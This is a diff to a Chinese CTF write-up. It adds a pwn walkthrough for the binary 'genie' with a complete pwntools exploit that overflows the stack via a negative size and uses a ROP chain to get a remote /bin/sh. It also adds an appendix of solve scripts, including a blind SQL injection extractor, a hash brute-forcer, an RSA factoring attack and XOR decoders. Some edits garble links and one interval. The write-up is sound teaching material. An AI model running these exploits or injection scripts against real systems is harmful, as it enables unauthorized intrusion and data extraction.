@@ -31,6 +31,8 @@
 - [Pwn](#pwn)
   - [赛尔号出发](#赛尔号出发)
   - [README--做题之前必看](#做题之前必看)
+  - [灯神的愿望](#灯神的愿望)
+- [附件](#附件)
 
 ---
 
@@ -747,7 +749,7 @@ SQLite functions only, no spaces
 全程只用数据库内置函数完成注入，不需要任何比较运算符或逻辑控制流
 
 
-[自动化盲注脚本 SQL.py](附件/script/SQL/SQL.py)
+自动化盲注脚本 SQL.py
 
 
 ## Crypto
@@ -963,7 +965,7 @@ for i in range(1000000):
 ```
 flag{231741}
 ```
-[py脚本](附件/script/shadow/solve1.py)
+py脚本
 
 ### 匆忙的密钥
 
@@ -1152,7 +1154,7 @@ A×C = 2^113 × 5^3 × 11 × 17
 一共 114 × 4 × 2 × 2 = 1824 种分法
 每种分法对应一个 (A, C)
 
-A 和 C 都是 p、q 的最高 64 位，所以必须在 64 位数范围 `[2^63, 2^64)` 内
+A 和 C 都是 p、q 的最高 64 位，所以必须在 64 位数范围 `2^63, 2^64)` 内
 1824 种分法里大部分分出来的数太小或太大，筛掉后只剩 6 组
 
 ```
@@ -1206,7 +1208,7 @@ print(long_to_bytes(m))
 HJSEC{weak_seed_rsa_private_key_leak_2026}
 ```
 附件：
-[豆姐写的py脚本，点击跳转](附件/script/匆忙的密钥/solve.py)
+[豆姐写的py脚本，点击跳转
 
 ## Reverse
 
@@ -1318,7 +1320,7 @@ Enter flag: [+] Correct! Welcome to GUET.
 GUET{W3lcme_t0_GUET_it_1s_g00d}
 ```
 
-[解密脚本](附件/script/开开心心来签个到/solve.py)
+解密脚本
 
 
 ### EZMAZE
@@ -1512,8 +1514,8 @@ print(flag.decode())
 HJSEC{maze_parser_ok}
 ```
 
-[解密脚本](附件/script/EZMAZE/flag.py)
-[地图绘制脚本](附件/script/EZMAZE/map.py)
+解密脚本
+地图绘制脚本
 
 ### signup
 
@@ -1953,7 +1955,7 @@ hjsc{w0_nen9_Da_sh4ngha1_M@j0r}
 True
 ```
 
-[脚本](附件/script/py交易/solve.py)
+脚本
 
 ### BigRound
 
@@ -2178,7 +2180,7 @@ GUET{Yu_f1nd_th3_r3A1_C0ntro1_stream}
 GUET{Yu_f1nd_th3_r3A1_C0ntro1_stream}
 ```
 
-[脚本](附件/script/guessTheNumber/solve.py)
+脚本
 
 
 ## Pwn
@@ -2357,4 +2359,592 @@ GUET{Today_Hope_You_Can_Learn_Kownledge_{XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX}}
 
 ```
 GUET{Today_Hope_You_Can_Learn_Kownledge_{XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX}}
+```
+
+
+### 灯神的愿望
+
+#### 一、思路
+
+```
+64 位 ELF，无 PIE 无 Canary NX 关闭
+反汇编发现 magic() 函数直接 system(rdi)
+.data 段有 "/bin/sh" 字符串
+菜单选 1 后，第二次 scanf 读一个有符号 int 作为 read 的大小
+输入 -1，有符号比较 -1<=1 通过检查，但 mov edx 零扩展后 size=0xffffffff
+超大 read 造成栈溢出
+ret2system("/bin/sh")
+```
+
+#### 二、分析
+
+##### 2.1 查保护
+
+```bash
+checksec genie
+```
+
+<img src="附件\images\灯神的愿望\Snipaste_2026-10-21_12-54-49.png" alt="checksec">
+
+
+没有 Canary、没有 PIE，地址全固定， 考虑 ROP
+
+##### 2.2 找后门函数
+
+有一个 `magic` 函数：
+<img src="附件\images\灯神的愿望\Snipaste_2026-10-21_23-03-13.png" alt="magic">
+
+`magic` 直接 `system(rdi)`
+
+
+看 `.data` 段
+有个全局变量 `binsh_str`：
+
+```
+.data:0000000000404060 binsh_str       db '/bin/sh',0
+```
+
+得到后门和命令字符串
+然后控制 `rdi`
+
+##### 2.3 找溢出
+
+main：
+
+```
+1. Make more wishes
+2. Make a normal wish
+3. Exit
+```
+
+选 `1` 之后的逻辑
+
+<img src="附件\images\灯神的愿望\choose_1.png" alt="Choose_1">
+
+因为正数只能输入 `1` 来给后面的 `nbytes`
+决定能read的buf的大小，所以要创造栈溢出的条件
+
+```c
+  puts("How many wishes do you want?");
+  __isoc99_scanf("%d", &v5);
+  if ( (int)v5 > 1 )
+  {
+    puts("Too many wishes.");
+    exit(0);
+  }
+  LODWORD(nbytes) = v5;
+  printf("You can make %u wishes.\n", v5);
+  puts("Enter your wish content:");
+  read(0, buf, (unsigned int)nbytes);
+```
+
+
+`n` 有符号 int，输入 `-1`
+有符号比较 `-1 <= 1` 通过检查
+`read` 的第三个参数是 `mov edx, [rbp-4]`，这是零扩展到 64 位
+`-1` 的补码是 `0xffffffff`
+零扩展后就是 `0x00000000FFFFFFFF` ，buf的上限变成大约4G
+
+负数跳过"<= 1"的检查和 printf `%u` 无符号打印，现在有了栈溢出的条件
+
+##### 2.4 算偏移 ROP
+
+```
+高
+  rbp+8  返回地址
+  rbp    旧 rbp
+  ...
+  rbp-0x70  read 的buf
+低
+```
+
+从 `buf` 到返回地址：`0x70 + 8 = 120` 字节
+
+再找一个 `pop rdi; ret` gadget 来设置 `rdi = "/bin/sh"`
+在`__libc_csu_init` 尾部：
+
+```
+0x401463: pop rdi; ret
+```
+
+ROP：
+
+```
+120 字节 + 0x401463(pop rdi; ret) + 0x404060("/bin/sh") + ret 栈对齐 + system@plt
+```
+
+##### 2.5 exp 
+
+```python
+from pwn import *
+
+io = remote('ctf.guetsec.cn', 30002)
+
+pop_rdi    = 0x401463  # pop rdi; ret
+bin_sh     = 0x404060  # `.data` 段里 `/bin/sh` 字符串的地址
+ret_gadget = 0x40123c
+system_plt = 0x4010c0
+
+offset = 120
+
+payload = b'A' * offset
+payload += p64(pop_rdi)   # pop rdi; ret
+payload += p64(bin_sh)    # pop取这个
+payload += p64(ret_gadget)  #ret 取这个
+payload += p64(system_plt)  
+# Linux 下函数第一个参数永远通过 rdi 传，这里rdi的值是'/bin/sh'
+
+
+io.sendlineafter(b'What do you want?', b'1')
+io.sendlineafter(b'How many wishes do you want?', b'-1')
+io.recvuntil(b'wish content:')
+io.send(payload)
+
+io.interactive()
+```
+
+#### 三、最终 Flag
+```
+flag{uuid}
+```
+
+
+## 附件：脚本源码
+
+### Web - SQL 布尔盲注自动化脚本
+
+```python
+import requests
+import time
+
+#配置
+BASE_URL = "http://ctf.guetsec.cn:30032/?action=api&order="
+TARGET_SUBQUERY = "(SELECT hex(group_concat(name)) FROM files)"  # 要提取的数据
+MAX_LEN = 1024          # 最大提取长度（hex 字符数）
+DELAY = 0.1            # 间隔 0.1s
+
+
+"""
+    发送一个注入表达式，判断条件是否为真
+    返回 True  = 条件为真  排序反转,Apple第一
+    返回 False = 条件为假  排序正常,Zebra第一
+    返回 None  = 请求出错
+"""
+
+def test_condition(expr: str) -> bool | None:
+    url = BASE_URL + requests.utils.quote(expr, safe='')
+    try:
+        resp = requests.get(url, timeout=10)
+        data = resp.json()
+
+        if "error" in data:
+            return None
+
+        # 第一条记录 id=2,Apple,排序反转,条件为真
+        if data["data"][0]["id"] == 2:
+            return True
+        else:
+            return False
+
+    except Exception as e:
+        print(f"\n[!] 请求出错: {e}")
+        return None
+
+
+def extract_hex_char(pos: int) -> str | None:
+    """
+    提取目标 hex 字符串的第 pos 个字符（从 1 开始）。
+    遍历 0-9, A-F,找到匹配的那个。
+    返回字符（'0'~'F'），如果该位置无字符则返回 None。
+    """
+    hex_chars = "0123456789ABCDEF"
+
+    for c in hex_chars:
+        ascii_val = ord(c)  # 字符的 ASCII 码
+
+        # 构造完整的注入表达式
+        # min(instr(name,char(90)), instr(substr(目标hex, pos, 1), char(猜的ASCII)))
+        expr = (
+            f"min(instr(name,char(90)),"
+            f"instr(substr({TARGET_SUBQUERY},{pos},1),char({ascii_val})))"
+        )
+
+        result = test_condition(expr)
+        time.sleep(DELAY)
+
+        if result is True:
+            return c
+        
+    return None
+
+
+def hex_to_string(hex_str: str) -> str:
+    #把 hex 字符串转成普通字符串
+    result = ""
+    for i in range(0, len(hex_str), 2):
+        byte = int(hex_str[i:i+2], 16)
+        result += chr(byte)
+    return result
+
+
+def main():
+    print("=" * 60)
+    print("布尔盲注自动化")
+    print("=" * 60)
+    print(f"目标子查询: {TARGET_SUBQUERY}")
+    print()
+    print("开始提取...")
+    print()
+
+    hex_result = ""
+
+    for pos in range(1, MAX_LEN + 1):
+        c = extract_hex_char(pos)
+
+        if c is None:
+            print(f"\n\n共 {pos - 1} 个 hex 字符")
+            break
+
+        hex_result += c
+        print(c, end="", flush=True)  # 实时打印
+
+    print()
+    print("-" * 30)
+    print(f"Hex 结果: {hex_result}")
+    print("-" * 30)
+
+    if len(hex_result) % 2 == 0 and len(hex_result) > 0:
+        plain = hex_to_string(hex_result)
+        print(f"解码结果: {plain}")
+        print()
+
+    else:
+        print("hex不是整数")
+
+
+if __name__ == "__main__":
+    main()
+```
+
+### Crypto - shadow 口令爆破脚本
+
+```python
+import hashlib  # 哈希库
+
+# 已知的盐值，和口令拼接后再做哈希
+salt = "35712258"
+
+#暴力计算求哪个 6 位数字口令能算出这个hash
+ture_hash = "cd46936c5c396f66b2971b12d427563a3b0d9a671a8ee0e9eb7e809571d3ddb7"
+
+# 枚举所有可能的 6 位数字口令
+for i in range(1000000):
+    password = str(i).zfill(6)  # zero-fill,在字符串的左边补零到6位
+
+    # salt与password进行拼接转字节串，然后计算 SHA-256，转成十六进制字符串
+    hash = hashlib.sha256((salt + password).encode()).hexdigest()
+
+    # 哈希和目标哈希一致，则输出口令
+    if hash == ture_hash:
+        print(f"口令: {password}")
+        break
+```
+
+### Crypto - 匆忙的密钥 RSA 分解解密脚本
+
+```python
+from math import isqrt
+from Crypto.Util.number import inverse, long_to_bytes, isPrime
+
+n = int("128238150108052472971107509871501016687988927864918262138868046480163613798632355139985981976662480300710530454772760612038397547791656528394404617136997918435337816829254365979998999271329107900358983183976875337477886150419905532163253782516831853481674653012279771019498880575085696755934298779035029630941")
+e = 65537
+c = int("6a8f0814c53fe588ffca775504aa70354b9f2c3f2875247179559cc50f3bddb28f90a90c951c829b01ca3f0398366e2f29920e74332e06f279c1297fbbe32597f2919e40eed1c8ddbe2cc24a058dc96da2b8b845fea8b79401ebe5c9d50cd74264c41552f665ed063bc57267e4b9964f603d8882c63b96c06110b74f90a4dff8", 16)
+
+print(f"n bit length = {n.bit_length()}")
+print(f"e = {e}")
+print()
+
+# 第一步：把 n 按 64 位字拆开，观察结构
+
+# n 是 1024 位 = 16 个 64 位字
+# word[0] 是最高 64 位，word[15] 是最低 64 位
+words = []
+temp = n
+for i in range(16):
+    words.append(temp & ((1 << 64) - 1))
+    temp >>= 64
+words.reverse()  # words[0] = 最高位
+
+print("=== n 的 64 位字结构 ===")
+for i, w in enumerate(words):
+    marker = " ← 非零" if w != 0 else ""
+    print(f"  word[{i:2d}] = {w:016x}{marker}")
+print()
+
+# 第二步：从 n 中提取三段
+
+# p = A * 2^448 + B,  q = C * 2^448 + D
+# n = p*q = A*C * 2^896 + (A*D + B*C) * 2^448 + B*D
+#
+# 对应到 n 的字：
+#   最高 128 位 = A*C
+#   中间部分     = A*D + B*C
+#   最低 128 位 = B*D
+
+AC = n >> 896                           # A*C（最高 128 位）
+rest = n - AC * (1 << 896)
+middle = rest >> 448                    # A*D + B*C
+BD = rest & ((1 << 448) - 1)            # B*D（最低 128 位）
+
+print(f"A*C      = {hex(AC)}")
+print(f"A*D+B*C  = {hex(middle)}")
+print(f"B*D      = {hex(BD)}")
+print()
+
+# 第三步：分解 A*C，找所有因数对 (A, C)
+
+# A 和 C 都是 64 位数（p、q 的最高 64 位）
+# 先对 AC 做质因数分解，再枚举所有因数，挑两边都是 64 位的
+print("=== 分解 A*C ===")
+print(f"A*C = {AC}")
+
+# 分解质因数
+def factorize(x):
+    factors = {}
+    d = 2
+    while d * d <= x:
+        while x % d == 0:
+            factors[d] = factors.get(d, 0) + 1
+            x //= d
+        d += 1 if d == 2 else 2
+    if x > 1:
+        factors[x] = factors.get(x, 0) + 1
+    return factors
+
+factors = factorize(AC)
+print(f"质因数分解: {factors}")
+
+# 枚举所有因数
+divisors = [1]
+for prime, exp in factors.items():
+    new_divs = []
+    for dv in divisors:
+        mul = 1
+        for k in range(exp + 1):
+            new_divs.append(dv * mul)
+            mul *= prime
+    divisors = new_divs
+
+# 筛选两边都是 64 位数 [2^63, 2^64) 的因数对
+pairs = []
+for d in divisors:
+    other = AC // d
+    if 2**63 <= d < 2**64 and 2**63 <= other < 2**64:
+        pairs.append((d, other))
+
+print(f"64 位因数对 ({len(pairs)} 组):")
+for a, cc in pairs:
+    print(f"  A = {hex(a)}, C = {hex(cc)}")
+print()
+
+# 第四步：对每组 (A, C)，列二次方程求 B
+
+# 已知：
+#   A*C = AC
+#   A*D + B*C = middle
+#   B*D = BD
+#
+# 消去 D：D = (middle - B*C) / A
+# 代入 B*D = BD：
+#   B * (middle - B*C) / A = BD
+#   C*B^2 - middle*B + A*BD = 0
+#
+# 解二次方程：B = (middle ± sqrt(middle^2 - 4*C*A*BD)) / (2*C)
+
+print("=== 求解 ===")
+found = False
+for A, C in pairs:
+    discriminant = middle * middle - 4 * C * A * BD
+    if discriminant < 0:
+        continue
+    sqrt_d = isqrt(discriminant)
+    if sqrt_d * sqrt_d != discriminant:
+        continue  # 不是完全平方数，跳过
+
+    for sign in [1, -1]:
+        numerator = middle + sign * sqrt_d
+        if numerator <= 0:
+            continue
+        if numerator % (2 * C) != 0:
+            continue
+        B = numerator // (2 * C)
+        if B <= 0 or B >= 2**64:
+            continue
+        if BD % B != 0:
+            continue
+        D = BD // B
+        if D <= 0 or D >= 2**64:
+            continue
+
+        # 验证
+        if A * D + B * C != middle:
+            continue
+        if B * D != BD:
+            continue
+
+        print(f"找到解！")
+        print(f"  A = {hex(A)}")
+        print(f"  B = {hex(B)}")
+        print(f"  C = {hex(C)}")
+        print(f"  D = {hex(D)}")
+
+        # 还原 p, q
+        p = A * (1 << 448) + B
+        q = C * (1 << 448) + D
+
+        print(f"\n  p = {hex(p)}")
+        print(f"  q = {hex(q)}")
+        print(f"  p 是素数: {isPrime(p)}")
+        print(f"  q 是素数: {isPrime(q)}")
+        print(f"  p*q == n: {p*q == n}")
+
+        # 解密
+        phi = (p - 1) * (q - 1)
+        d_key = inverse(e, phi)
+        m = pow(c, d_key, n)
+        flag = long_to_bytes(m)
+
+        print(f"\n  解密明文: {flag}")
+        found = True
+        break
+    if found:
+        break
+
+if not found:
+    print("未找到解")
+```
+
+### Reverse - 开开心心来签个到 异或解密脚本
+
+```python
+target = [
+    0x61, 0x73, 0x63, 0x72, 0x5D, 0x71, 0x15, 0x4A,
+    0x45, 0x4B, 0x43, 0x79, 0x52, 0x16, 0x79, 0x61,
+    0x73, 0x63, 0x72, 0x79, 0x4F, 0x52, 0x79, 0x17,
+    0x55, 0x79, 0x41, 0x16, 0x16, 0x42, 0x5B
+]
+
+flag = ''.join(chr(b ^ 0x26) for b in target)
+# join把字符或者字符串连接起来，中间没有分隔
+
+
+print(flag)
+```
+
+### Reverse - EZMAZE flag 解密脚本
+
+```python
+def ror7(x):
+    x = x & 0xff
+    #在8bit的情况下: ROR7(x) = ROL1(x)
+    return ((x >> 7) & 1) | ((x << 1) & 0xff)       #这里等价于__ROR1__(v12, 7)
+
+route = b"ddssaassssssddddddd"
+v12 = 0x42
+v11 = route[0]
+idx = 1
+while True:
+    if idx >= len(route):
+        v14 = 0
+    else:
+        v14 = route[idx]
+    v12 = v11 ^ ror7(v12)
+    v11 = v14
+    if v14 == 0:
+        break
+    idx += 1
+
+data = [
+0x58,0x28,0x47,0xD2,0x84,0x7D,0x70,0x07,0xD1,0x12,0x2F,
+0x52,0xAA,0x47,0x58,0xA6,0x3D,0x3E,0x24,0x33,0x32,
+0x0B,0x1E,0x13,0x07,0x19,0x20,0x0E,0x18,0x0A,0x08,0x1F,0x17,
+0x3B,0x08,0x0D,0x1C,0x00,0x00,0x00
+]
+
+flag = b""
+for i in range(0x15):
+    b = v12 ^ i ^ data[i+16]
+    flag += bytes([b])
+
+print("v12 =", hex(v12))
+try:
+    print(flag.decode())
+except:
+    print("wrong")
+```
+
+### Reverse - EZMAZE 迷宫绘制脚本
+
+```python
+map_data = [0x58, 0x28, 0x47, 0xD2, 0x84, 0x7D, 0x70, 0x07, 
+            0xD1, 0x12, 0x2F, 0x52, 0xAA, 0x47, 0x58, 0xA6,
+            0x3D, 0x3E, 0x24, 0x33, 0x32, 0x0B, 0x1E, 0x13, 
+            0x07, 0x19, 0x20, 0x0E, 0x18, 0x0A, 0x08, 0x1F, 
+            0x17, 0x3B, 0x08, 0x0D, 0x1C]
+
+def is_wall(x, y):
+    idx = x + 11 * y
+    byte = map_data[idx >> 3]
+    bit = (byte ^ 0xA7) >> (idx & 7) & 1
+    return bit == 1
+
+print("MAP,S=起点(1,1), E=终点(8,9), #=墙, .=非墙):")
+print("   " + "".join([f"{x:2d}" for x in range(11)]))
+for y in range(11):
+    row = f"{y:2d} "        #打印行号,后面追加地图数据
+    for x in range(11):
+        if (x, y) == (1, 1):
+            row += " S"
+        elif (x, y) == (8, 9):
+            row += " E"
+        elif is_wall(x, y):
+            row += " #"
+        else:
+            row += " ."
+    print(row)
+```
+
+### Reverse - py交易 置换+异或还原脚本
+
+```python
+#来自kongbeiqie.py
+flag = ''
+encode = 'YVYh]\x07@h\x0ehRwJVD\x07]s\x03D__ELzhY\x06_TP'
+table = (19, 14, 10, 24, 27, 6, 5, 12, 11, 15, 9, 26, 30, 22, 16, 28,
+         1, 13, 18, 2, 17, 21, 29, 4, 25, 7, 8, 23, 0, 3, 20)
+XOR_KEY = 55
+
+def enc(input):
+    tmp = ''
+    for i in range(len(input)):
+        tmp = tmp + chr(ord(input[table[i]]) ^ XOR_KEY)
+    return tmp
+
+# enc(flag) == encode  => 
+# flag[table[i]] = ord(encode[i]) ^ XOR_KEY
+ans = [''] * 31
+for i in range(31):
+    ans[table[i]] = chr(ord(encode[i]) ^ XOR_KEY)
+flag = ''.join(ans)
+print(flag)
+print(enc(flag) == encode)    # 校验结果是否正确
+```
+
+### Reverse - guessTheNumber 异或解密脚本
+
+```python
+enc = bytes.fromhex("7821352D093A1B6C39011A3B2844200C2B024A335231706F5E002D1801174C00021C130E13")
+key = b"H0w_t0_3ncrypt?"[::-1]
+flag = bytes([enc[i] ^ key[i % 15] for i in range(37)])
+print(flag.decode())
 ```
